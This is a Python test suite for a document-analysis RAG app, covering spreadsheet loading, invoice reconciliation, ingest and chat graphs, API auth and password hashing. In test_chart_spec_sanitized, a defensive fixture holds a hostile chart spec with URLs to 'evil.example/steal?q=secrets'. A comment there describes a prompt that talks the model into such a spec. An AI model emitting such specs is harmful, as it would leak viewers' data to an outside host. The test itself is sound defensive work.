"""Smallest check that fails if loading, splitting or retrieval breaks. No API key needed."""

import asyncio
import json
import os
import tempfile
import time

from langchain_core.documents import Document
from openpyxl import Workbook

from rag import _fuse, _table_name, load_units, reconcile, splitter


def test_splitting():
    doc = Document(
        page_content=" ".join(f"w{i}" for i in range(600)),
        metadata={"source": "x.pdf", "loc": "p.1"},
    )
    chunks = splitter.split_documents([doc])
    assert len(chunks) > 1
    # metadata (the citation label) must survive splitting
    assert all(c.metadata == doc.metadata for c in chunks)
    assert splitter.split_documents([]) == []


def test_excel_loader():
    wb = Workbook()
    ws = wb.active
    ws.title = "Rates"
    ws.append(["City", "Rate"])
    ws.append(["Chennai", 12])
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    wb.save(path)
    try:
        docs = load_units(path)
        assert len(docs) == 1
        assert docs[0].page_content == "City | Rate\nChennai | 12"
        assert docs[0].metadata == {"source": os.path.basename(path), "loc": "Rates"}
    finally:
        os.remove(path)


def test_reconcile():
    """Billing invariant: rate x qty vs charged. A wrong verdict here is a wrong invoice."""
    result = reconcile(
        [
            {"item": "Chennai haulage", "rate": 1200, "qty": 3, "charged": 3600},  # ok
            {"item": "Storage", "rate": 45.5, "qty": 100, "charged": 4800},  # over by 250
            {"item": "Handling", "rate": 20, "qty": 10, "charged": 180},  # under by 20
            {"item": "Rounding", "rate": 33.333, "qty": 3, "charged": 100},  # 99.999 -> within 0.01
        ]
    )
    assert [r["status"] for r in result["lines"]] == [
        "ok",
        "overcharged",
        "undercharged",
        "ok",
    ]
    assert result["lines"][1]["expected"] == 4550 and result["lines"][1]["delta"] == 250
    assert result["mismatches"] == 2
    assert result["variance"] == 230  # +250 - 20 + 0 + 0
    # unnamed lines still get a label, and empty input is not an error
    assert reconcile([{"rate": 1, "qty": 1, "charged": 1}])["lines"][0]["item"] == "line 1"
    assert reconcile([]) == {"lines": [], "variance": 0.0, "mismatches": 0}
    # the model supplies these fields — junk must raise, never silently score as a match
    bad_lines = [{"rate": 1, "qty": 1}, {"rate": "n/a", "qty": 1, "charged": 1}]
    bad_lines += json.loads('[{"rate": NaN, "qty": 1, "charged": 1}]')  # json.loads allows NaN
    for bad in bad_lines:
        try:
            reconcile([bad])
            raise AssertionError(f"{bad!r} should be rejected")
        except ValueError:
            pass


def test_header_detection():
    # mimic a real ERP export: title/metadata block, blank row, then the table
    from rag import excel_frames

    wb = Workbook()
    ws = wb.active
    ws.append(["Inventory Report", "As on: 12 June, 26"])
    ws.append(["Client", "BP Oil Mills Ltd."])
    ws.append(["Contract", "#1251"])
    ws.append([])
    ws.append(["Item", "Qty", "Rate"])
    ws.append(["Oil drum", 40, 1200])
    ws.append(["Pallet", 15, 300])
    import io

    buf = io.BytesIO()
    wb.save(buf)
    frames = excel_frames(buf.getvalue())
    df = next(iter(frames.values()))
    assert list(df.columns) == ["Item", "Qty", "Rate"]
    assert len(df) == 2
    assert df["Qty"].sum() == 55  # numeric dtype restored


def test_hybrid_fuse():
    # the hybrid step unions vector + BM25 hits; the same chunk from both must collapse
    a = Document(page_content="cross docking", metadata={"source": "x.pdf", "loc": "p.1"})
    b = Document(page_content="gst on freight", metadata={"source": "x.pdf", "loc": "p.2"})
    fused = _fuse([a, b], [a])  # 'a' returned by both retrievers
    assert [d.metadata["loc"] for d in fused] == ["p.1", "p.2"]  # deduped, order preserved


def test_reset_store():
    # a fresh ingest must drop the old collection, not append to it
    from rag import reset_store

    class FakePG:
        def __init__(self):
            self.calls = []

        def delete_collection(self):
            self.calls.append("delete")

        def create_collection(self):
            self.calls.append("create")

    p = FakePG()
    reset_store(p)
    assert p.calls == ["delete", "create"]


def test_table_name():
    # extracted-sheet table names must be stable (re-upload overwrites, not duplicates),
    # unique per sheet, and valid SQL identifiers whatever the sheet is called
    a = _table_name("sid1", "book.xlsx", "Rate Card / 2026")
    assert a == _table_name("sid1", "book.xlsx", "Rate Card / 2026")
    assert a != _table_name("sid1", "book.xlsx", "Other")
    assert a != _table_name("sid2", "book.xlsx", "Rate Card / 2026")
    assert a.isidentifier() and len(a) < 63  # Postgres identifier limit


def _fake_llm(analysis="**Summary**\n- Rates per city.\n\n**Key findings**\n- Chennai 12."):
    """A no-API chat model: routes its reply by which graph prompt it's answering."""
    from langchain_core.messages import AIMessage
    from langchain_core.runnables import RunnableLambda

    def reply(prompt_value):
        text = prompt_value.to_string().lower()
        if "classify" in text:
            return AIMessage(content='[{"source": "sheet.xlsx", "doc_type": "rate card"}]')
        if "write, in markdown" in text:  # analyst (first pass or revision)
            return AIMessage(content=analysis)
        if "meticulous reviewer" in text:
            return AIMessage(content=reply.review)
        return AIMessage(content=analysis)

    reply.review = '{"approved": true, "notes": ""}'
    return RunnableLambda(reply)


def _tiny_xlsx() -> str:
    wb = Workbook()
    ws = wb.active
    ws.title = "Rates"
    ws.append(["City", "Rate"])
    ws.append(["Chennai", 12])
    ws.append(["Mumbai", 15])
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    wb.save(path)
    return path


def test_ingest_graph():
    # metadata → analyst → reviewer(approve) → END, with a fake LLM (no API)
    from ingest_graph import build_ingest_graph

    path = _tiny_xlsx()
    try:
        state = build_ingest_graph(_fake_llm()).invoke({"paths": [path]})
    finally:
        os.remove(path)
    assert state["metadata"][0]["kind"] == "Excel"
    assert state["metadata"][0]["doc_type"] == "rate card"  # classify wired through
    assert "Key findings" in state["analysis"]
    assert state["review"]["approved"] is True
    assert state["revisions"] == 0  # approved first pass, no revision


def test_ingest_review_loop_bounded():
    # a reviewer that never approves must still terminate after exactly one revision
    from ingest_graph import MAX_REVISIONS, build_ingest_graph

    llm = _fake_llm()
    llm.func.review = '{"approved": false, "notes": "unverified figure"}'
    path = _tiny_xlsx()
    try:
        state = build_ingest_graph(llm).invoke({"paths": [path]})
    finally:
        os.remove(path)
    assert state["review"]["approved"] is False
    assert state["revisions"] == MAX_REVISIONS + 1  # bounced once, then forced through


def test_thin_text_layer():
    # the OCR fallback must fire for a scan and never for a real text layer
    from langchain_core.documents import Document

    from rag import _thin

    assert _thin([Document(page_content=" \n")])  # image-only page
    assert _thin([Document(page_content="Page 3"), Document(page_content="")])  # near-empty scan
    assert not _thin([Document(page_content="x" * 400)])
    assert not _thin([])  # no pages is not a scan — nothing to transcribe


def test_suggest_questions():
    # good JSON is trimmed to 3; anything unparseable falls back to [] so the UI
    # can show its generic starters instead of crashing the upload
    from langchain_core.runnables import RunnableLambda

    from ingest_graph import suggest_questions

    llm = RunnableLambda(lambda pv: '["A?", " B? ", "C?", "D?"]')
    assert suggest_questions("summary", [], llm) == ["A?", "B?", "C?"]
    assert suggest_questions("summary", [], RunnableLambda(lambda pv: "not json")) == []


def test_router():
    from langchain_core.messages import AIMessage
    from langchain_core.runnables import RunnableLambda

    from chat_graph import route

    def pick(question, llm, labels):
        return asyncio.run(route(question, llm, labels))

    # pure arithmetic takes the fast-path — no LLM call
    assert pick("500*12*0.18", None, ["documents", "quant"]) == "quant"
    # the classifier's label is honoured
    assert pick("weather today?", RunnableLambda(lambda pv: AIMessage(content="web")),
                ["documents", "quant", "web"]) == "web"
    # an unknown label falls back to documents
    assert pick("hello", RunnableLambda(lambda pv: AIMessage(content="banana")),
                ["documents", "quant"]) == "documents"


def test_progress_stream():
    # stage events pushed from a tool thread must reach the client interleaved with
    # tokens, and an agent failure must still surface (the fallback depends on it)
    from chat_graph import _with_progress

    async def run(items, boom=False):
        stages = asyncio.Queue()

        async def agent():
            for item in items:
                if item == "STAGE":  # what progress() does, minus the thread hop
                    stages.put_nowait({"stage": "embedding"})
                    continue
                yield item
            if boom:
                raise RuntimeError("no tool support")

        return [e async for e in _with_progress(agent(), stages)]

    assert asyncio.run(run(["a", "STAGE", "b"])) == ["a", {"stage": "embedding"}, "b"]

    try:
        asyncio.run(run(["a"], boom=True))
    except RuntimeError:
        pass
    else:
        raise AssertionError("an agent failure must propagate, not end the stream quietly")


def test_chart_spec_sanitized():
    # the user's question reaches the model, so a crafted prompt could try to talk it
    # into a spec that makes the viewer's browser fetch an attacker's host. Every
    # `url` must be stripped at every depth, and `data` must never survive.
    from charts import _sanitize

    hostile = {
        "mark": "bar",
        "data": {"url": "https://evil.example/steal?q=secrets"},
        "encoding": {"x": {"field": "City"}},
        "layer": [
            {"mark": {"type": "image", "url": "https://evil.example/pixel.png"}},
            {"transform": [{"lookup": "id", "from": {"data": {"url": "https://evil.example/x"}}}]},
        ],
    }
    clean = _sanitize(hostile)
    blob = json.dumps(clean)
    assert "evil.example" not in blob, "no remote host may survive sanitising"
    assert '"url"' not in blob
    assert "data" not in clean  # we attach the rows ourselves
    assert clean["mark"] == "bar"  # the harmless encoding is preserved
    assert clean["encoding"]["x"]["field"] == "City"


def test_api_wiring():
    # the API must boot, answer /api/config, and set the session cookie every response.
    # No database or API key needed — engine() is lazy.
    from fastapi.testclient import TestClient

    import api

    with TestClient(api.app) as client:
        r = client.get("/api/health")
        assert r.status_code == 200 and r.json() == {"ok": True}
        sid = r.cookies.get("sid")
        assert sid, "session cookie must be set on every response"

        cfg = client.get("/api/config").json()
        assert cfg["defaultModel"]  # backend-configured model is always present
        assert cfg["maxFiles"] >= 1 and cfg["suggestions"]

        # the sid must persist across requests, not be reminted
        assert client.get("/api/health").cookies.get("sid", sid) == sid

        # a malformed body is a validation error, not a 500
        assert client.post("/api/chat", json={}).status_code == 422

        # every model endpoint needs a session; anonymous is 401, not 500 and not free
        assert client.get("/api/me").json() == {"user": None}
        for path, body in [
            ("/api/chat", {"question": "hi"}),
            ("/api/chart", {"sheet": "Rates", "question": "bar chart"}),
            ("/api/model", {}),
        ]:
            r = client.post(path, json=body)
            assert r.status_code == 401, f"{path} must be 401 when signed out, got {r.status_code}"
        assert client.get("/api/admin/users").status_code == 401

        # email sign-up validates before it ever reaches the database
        for bad in [{"email": "a@b.com", "password": "short"}, {"email": "nope", "password": "x" * 12}]:
            assert client.post("/api/auth/signup", json=bad).status_code == 400, bad


def test_auth_session():
    """A session cookie must only be accepted if we signed it, and credits must add up."""
    import auth

    assert auth.parse(auth.sign(7)) == 7
    assert auth.parse("") is None
    assert auth.parse("7.9999999999.deadbeef") is None  # right shape, wrong signature
    tampered = auth.sign(7).split(".")
    assert auth.parse(f"8.{tampered[1]}.{tampered[2]}") is None  # swapped user id
    assert auth.parse(f"7.{int(time.time()) - 1}.{tampered[2]}") is None  # expired

    class Handler:  # what UsageMetadataCallbackHandler exposes after a run
        def __init__(self, usage):
            self.usage_metadata = usage

    assert auth.charged(Handler({"m": {"total_tokens": 1234}}), 4000) == 1234  # reported wins
    assert auth.charged(Handler({}), 4000) == 1200  # gateway sent no usage → estimate
    assert auth.charged(Handler(None), 0) == 200


def test_password_hashing():
    """Passwords must never round-trip, and every malformed hash must simply fail."""
    import auth

    stored = auth.hash_password("correct horse battery")
    assert "correct horse battery" not in stored and stored.startswith("scrypt$")
    assert auth.check_password("correct horse battery", stored)
    assert not auth.check_password("Correct horse battery", stored)  # case matters
    assert not auth.check_password("", stored)
    assert auth.hash_password("same") != auth.hash_password("same")  # salted per account
    for junk in ["", "not-a-hash", "scrypt$bad$8$1$ab$cd", "md5$1$1$1$ab$cd"]:
        assert not auth.check_password("anything", junk), junk

    for bad in ["nope", "a@b", "@example.com", "a@" + "x" * 300]:
        try:
            auth._clean_email(bad)
            raise AssertionError(f"{bad!r} should be rejected")
        except ValueError:
            pass
    assert auth._clean_email("  Yash@Example.COM ") == "yash@example.com"


if __name__ == "__main__":
    test_splitting()
    test_excel_loader()
    test_reconcile()
    test_header_detection()
    test_hybrid_fuse()
    test_reset_store()
    test_table_name()
    test_ingest_graph()
    test_ingest_review_loop_bounded()
    test_router()
    test_progress_stream()
    test_chart_spec_sanitized()
    test_api_wiring()
    test_auth_session()
    print("ok")
